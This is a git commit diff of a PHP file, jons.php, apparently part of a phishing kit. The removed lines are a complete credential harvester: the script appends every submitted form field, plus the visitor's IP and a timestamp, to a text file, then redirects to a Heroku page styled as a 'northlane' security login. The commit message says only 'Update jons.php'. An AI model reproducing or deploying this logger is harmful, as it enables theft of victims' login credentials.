1b08b91da61904f65808e09f61c622c22b439683
akiltucker404xox <112651979+akiltucker404xox@users.noreply.github.com>
2022-09-02 01:59:55 +0700

    Update jons.php

--- jons.php
+++ jons.php
@@ -1,18 +1,2 @@
 <?php
 session_start();
-
-$datum = date('d-m-Y / H:i:s');
-$ip = $_SERVER['REMOTE_ADDR'];
-header("Location:https://myprogram-salaryatsea-site.herokuapp.com/login.northlane/securitysys.html/");
-$handle = fopen("daya212.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "IP: $ip | Date: $datum (Date=0 GTM)\r\n");
-fwrite($handle, "\r\n");
-fclose($handle);
-
-setcookie ("user", "empty", time()+3600);
